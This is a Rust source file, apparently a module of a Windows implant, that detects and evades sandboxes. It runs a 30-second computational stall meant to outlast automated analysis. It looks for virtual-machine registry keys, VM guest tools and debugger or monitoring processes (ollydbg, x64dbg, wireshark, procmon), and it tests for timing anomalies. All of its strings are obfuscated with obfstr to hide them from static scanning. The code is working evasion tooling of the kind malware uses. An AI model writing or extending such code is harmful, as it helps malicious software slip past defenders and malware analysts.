use crate::debug;
use crate::win::reg::{RegistryKey, RegistryHive};
use crate::win::process::get_processes;
use obfstr::obfstr;
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};

#[derive(Debug, Clone)]
pub struct DetectionResult {
    pub is_detected: bool,
    pub confidence_score: u32,
    pub reasons: Vec<String>,
}

impl DetectionResult {
    pub fn new() -> Self {
        Self {
            is_detected: false,
            confidence_score: 0,
            reasons: Vec::new(),
        }
    }

    pub fn add_detection(&mut self, reason: String, score: u32) {
        self.is_detected = true;
        self.confidence_score += score;
        self.reasons.push(reason);
    }
}

#[derive(Debug, Clone)]
pub struct SandboxDetection {
    pub is_sandbox: bool,
    pub confidence_score: u32,
    pub hardware_detection: DetectionResult,
    pub sysinfo_detection: DetectionResult,
    pub time_detection: DetectionResult,
}

impl SandboxDetection {
    pub fn new() -> Self {
        Self {
            is_sandbox: false,
            confidence_score: 0,
            hardware_detection: DetectionResult::new(),
            sysinfo_detection: DetectionResult::new(),
            time_detection: DetectionResult::new(),
        }
    }
}


/// Perform complex computational task to evade sandbox analysis
/// This function executes multiple types of intensive computations
/// to consume significant CPU time and memory, making it difficult
/// for sandboxes to skip or accelerate execution
pub fn perform_computational_task(seed: u64) -> u64 {
    let start_time = std::time::Instant::now();
    let target_duration = std::time::Duration::from_secs(30); // Target 30 seconds
    
    let mut result = seed;
    let mut phase = 0u8;
    
    // Continue until we've spent enough time
    while start_time.elapsed() < target_duration {
        match phase % 8 {
            0 => result = phase_prime_generation(result),
            1 => result = phase_matrix_operations(result),
            2 => result = phase_memory_intensive(result),
            3 => result = phase_string_operations(result),
            4 => result = phase_recursive_computation(result),
            5 => result = phase_bit_manipulation(result),
            6 => result = phase_hash_chains(result),
            7 => result = phase_fibonacci_series(result),
            _ => unreachable!(),
        }
        phase = phase.wrapping_add(1);
        
        // Add some unpredictable delays
        if result % 100 == 0 {
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }
    
    result
}

/// Phase 1: Prime number generation and verification
fn phase_prime_generation(mut seed: u64) -> u64 {
    let mut count = 0u64;
    let mut num = (seed % 10000) + 2;
    
    // Find primes using trial division
    for _ in 0..5000 {
        if is_prime(num) {
            count = count.wrapping_add(num);
        }
        num += 1;
    }
    
    seed.wrapping_add(count)
}

/// Check if a number is prime
fn is_prime(n: u64) -> bool {
    if n < 2 { return false; }
    if n == 2 { return true; }
    if n % 2 == 0 { return false; }
    
    let sqrt_n = (n as f64).sqrt() as u64;
    for i in (3..=sqrt_n).step_by(2) {
        if n % i == 0 {
            return false;
        }
    }
    true
}

/// Phase 2: Matrix operations
fn phase_matrix_operations(mut seed: u64) -> u64 {
    let size = 100;
    let mut matrix_a = vec![vec![0u64; size]; size];
    let mut matrix_b = vec![vec![0u64; size]; size];
    
    // Initialize matrices
    for i in 0..size {
        for j in 0..size {
            matrix_a[i][j] = seed.wrapping_mul(i as u64).wrapping_add(j as u64);
            matrix_b[i][j] = seed.wrapping_add(i as u64).wrapping_mul(j as u64);
        }
    }
    
    // Matrix multiplication
    for i in 0..size {
        for j in 0..size {
            let mut sum = 0u64;
            for k in 0..size {
                sum = sum.wrapping_add(matrix_a[i][k].wrapping_mul(matrix_b[k][j]));
            }
            seed = seed.wrapping_add(sum);
        }
    }
    
    seed
}

/// Phase 3: Memory intensive operations
fn phase_memory_intensive(mut seed: u64) -> u64 {
    let mut memory_blocks = Vec::new();
    let block_size = 4096;
    let num_blocks = 1000;
    
    // Allocate memory blocks
    for i in 0..num_blocks {
        let mut block = vec![0u8; block_size];
        
        // Fill with patterns
        for j in 0..block_size {
            block[j] = ((seed.wrapping_add(i).wrapping_add(j as u64)) % 256) as u8;
        }
        
        memory_blocks.push(block);
    }
    
    // Random access patterns to confuse analysis
    for _ in 0..50000 {
        let block_idx = (seed % num_blocks as u64) as usize;
        let byte_idx = (seed % block_size as u64) as usize;
        
        if !memory_blocks.is_empty() && block_idx < memory_blocks.len() {
            let value = memory_blocks[block_idx][byte_idx];
            seed = seed.wrapping_add(value as u64);
        }
        
        seed = seed.wrapping_mul(1103515245).wrapping_add(12345); // LCG
    }
    
    seed
}

/// Phase 4: String operations
fn phase_string_operations(mut seed: u64) -> u64 {
    let mut strings = Vec::new();
    
    // Generate strings
    for i in 0..1000 {
        let mut s = String::new();
        for j in 0..100 {
            let ch = ((seed.wrapping_add(i).wrapping_add(j) % 26) + 97) as u8 as char;
            s.push(ch);
        }
        
        // String manipulations
        let reversed = s.chars().rev().collect::<String>();
        let uppercase = s.to_uppercase();
        let repeated = s.repeat(3);
        
        strings.push(format!("{}-{}-{}-{}", s, reversed, uppercase, repeated));
        seed = seed.wrapping_add(s.len() as u64);
    }
    
    // String searching and processing
    for s in &strings {
        let bytes = s.as_bytes();
        for &byte in bytes {
            seed = seed.wrapping_add(byte as u64);
        }
    }
    
    seed
}

/// Phase 5: Recursive computations
fn phase_recursive_computation(seed: u64) -> u64 {
    let n = (seed % 40) + 5; // Limit to prevent stack overflow
    let fib_result = fibonacci_recursive(n);
    let factorial_result = factorial_recursive(n % 20);
    
    seed.wrapping_add(fib_result).wrapping_add(factorial_result)
}

/// Recursive fibonacci
fn fibonacci_recursive(n: u64) -> u64 {
    if n <= 1 {
        n
    } else {
        fibonacci_recursive(n - 1).wrapping_add(fibonacci_recursive(n - 2))
    }
}

/// Recursive factorial
fn factorial_recursive(n: u64) -> u64 {
    if n <= 1 {
        1
    } else {
        n.wrapping_mul(factorial_recursive(n - 1))
    }
}

/// Phase 6: Bit manipulation operations
fn phase_bit_manipulation(mut seed: u64) -> u64 {
    for _ in 0..100000 {
        // Various bit operations
        seed ^= seed << 13;
        seed ^= seed >> 17;
        seed ^= seed << 5;
        
        // Bit counting
        let popcount = seed.count_ones() as u64;
        seed = seed.wrapping_add(popcount);
        
        // Bit rotation simulation
        seed = seed.rotate_left(1).wrapping_add(seed.rotate_right(1));
        
        // Complex bit patterns
        seed = (seed & 0xAAAAAAAAAAAAAAAA) | ((seed & 0x5555555555555555) << 1);
    }
    
    seed
}

/// Phase 7: Hash chain computations
fn phase_hash_chains(mut seed: u64) -> u64 {
    let mut hasher = DefaultHasher::new();
    
    for i in 0..50000 {
        // Multiple hash rounds
        seed.hash(&mut hasher);
        let hash1 = hasher.finish();
        
        hash1.hash(&mut hasher);
        let hash2 = hasher.finish();
        
        (seed ^ hash1 ^ hash2).hash(&mut hasher);
        let hash3 = hasher.finish();
        
        seed = seed.wrapping_add(hash1).wrapping_add(hash2).wrapping_add(hash3);
        
        // Add iteration-dependent computation
        seed = seed.wrapping_mul(i).wrapping_add(0x9e3779b9);
    }
    
    seed
}

/// Phase 8: Fibonacci series with iterations
fn phase_fibonacci_series(mut seed: u64) -> u64 {
    let mut a = seed % 1000;
    let mut b = (seed >> 10) % 1000;
    
    // Generate large fibonacci-like sequence
    for _ in 0..100000 {
        let next = a.wrapping_add(b);
        seed = seed.wrapping_add(next);
        a = b;
        b = next;
    }
    
    seed
}

/// Detect hardware configuration anomalies
fn detect_hardware_anomalies() -> DetectionResult {
    let mut result = DetectionResult::new();

    // Check CPU core count
    let cpu_count = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1);
    if cpu_count < 2 {
        result.add_detection(
            format!("{}: {} ({})", 
                obfstr!("Low CPU core count"), 
                cpu_count, 
                obfstr!("modern systems typically have >=2")),
            20,
        );
    }

    // Check USB device usage history
    if RegistryKey::open(
        RegistryHive::LocalMachine,
        obfstr!("SYSTEM\\CurrentControlSet\\Enum\\USB"),
    ).is_err() {
        result.add_detection(
            obfstr!("No USB device usage history found").to_string(),
            15,
        );
    }

    result
}

/// Detect system information anomalies
fn detect_sysinfo_anomalies() -> DetectionResult {
    let mut result = DetectionResult::new();

    // Check for suspicious registry keys
    let suspicious_registry_keys = vec![
        obfstr!("SOFTWARE\\Oracle\\VirtualBox Guest Additions").to_string(),
        obfstr!("SOFTWARE\\VMware, Inc.\\VMware Tools").to_string(),
        obfstr!("SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters").to_string(),
    ];

    for key_path in &suspicious_registry_keys {
        if RegistryKey::open(RegistryHive::LocalMachine, key_path).is_ok() {
            result.add_detection(
                format!("{}: {}", 
                    obfstr!("Virtualization software registry key found"), 
                    key_path),
                25,
            );
        }
    }

    // Check running processes
    if let Ok(processes) = get_processes() {
        let suspicious_processes = vec![
            obfstr!("vboxservice").to_string(), obfstr!("vboxtray").to_string(), 
            obfstr!("vmtoolsd").to_string(), obfstr!("vmwaretray").to_string(),
            obfstr!("wireshark").to_string(), obfstr!("procmon").to_string(), 
            obfstr!("regmon").to_string(), obfstr!("filemon").to_string(), 
            obfstr!("procexp").to_string(), obfstr!("apimonitor").to_string(), 
            obfstr!("idaq").to_string(), obfstr!("ollydbg").to_string(), 
            obfstr!("windbg").to_string(), obfstr!("x32dbg").to_string(), 
            obfstr!("x64dbg").to_string(),
        ];

        for process in processes.values() {
            for suspicious in &suspicious_processes {
                if process.name.to_lowercase().contains(suspicious) {
                    result.add_detection(
                        format!("{}: {}", 
                            obfstr!("Suspicious process detected"), 
                            process.name),
                        20,
                    );
                }
            }
        }

        // More lenient process count check
        if processes.len() < 20 {
            result.add_detection(
                format!("{}: {} ({})", 
                    obfstr!("Low process count"), 
                    processes.len(), 
                    obfstr!("typical systems have >20")),
                15,
            );
        }
    }

    result
}

/// Detect time anomalies using relative analysis (no fixed thresholds)
fn detect_time_anomalies() -> DetectionResult {
    let mut result = DetectionResult::new();

    // Test 1: Sleep consistency - only flag extreme acceleration
    let sleep_start = std::time::Instant::now();
    std::thread::sleep(std::time::Duration::from_millis(100));
    let actual_sleep = sleep_start.elapsed();
    
    let sleep_ratio = actual_sleep.as_millis() as f64 / 100.0;
    if sleep_ratio < 0.2 {  // Only flag if < 20ms for 100ms request
        result.add_detection(
            format!("{}: {:.2}", 
                obfstr!("Extreme sleep acceleration detected, ratio"), 
                sleep_ratio),
            25,
        );
    }

    // Test 2: Timing source consistency
    let instant_start = std::time::Instant::now();
    let system_start = std::time::SystemTime::now();
    
    std::thread::sleep(std::time::Duration::from_millis(50));
    
    let instant_elapsed = instant_start.elapsed();
    let system_elapsed = system_start.elapsed().unwrap_or_default();
    
    if instant_elapsed.as_millis() > 10 && system_elapsed.as_millis() > 10 {
        let timing_ratio = instant_elapsed.as_millis() as f64 / system_elapsed.as_millis() as f64;
        if timing_ratio < 0.1 || timing_ratio > 10.0 {
            result.add_detection(
                format!("{}: {:.2}", 
                    obfstr!("Major timing discrepancy detected, ratio"), 
                    timing_ratio),
                20,
            );
        }
    }

    result
}

/// Execute sandbox detection
pub fn detect_sandbox() -> SandboxDetection {
    let mut detection = SandboxDetection::new();

    // Execute detection methods
    detection.hardware_detection = detect_hardware_anomalies();
    detection.sysinfo_detection = detect_sysinfo_anomalies();
    detection.time_detection = detect_time_anomalies();

    // Debug without obfstr
    debug!("Hardware detection: {:?}", detection.hardware_detection);
    debug!("System info detection: {:?}", detection.sysinfo_detection);
    debug!("Time detection: {:?}", detection.time_detection);

    // Calculate confidence score
    detection.confidence_score = detection.hardware_detection.confidence_score
        + detection.sysinfo_detection.confidence_score
        + detection.time_detection.confidence_score;

    // Higher threshold to reduce false positives
    detection.is_sandbox = detection.confidence_score >= 60;
    debug!("sandbox confidence score: {}", detection.confidence_score);
    detection
} 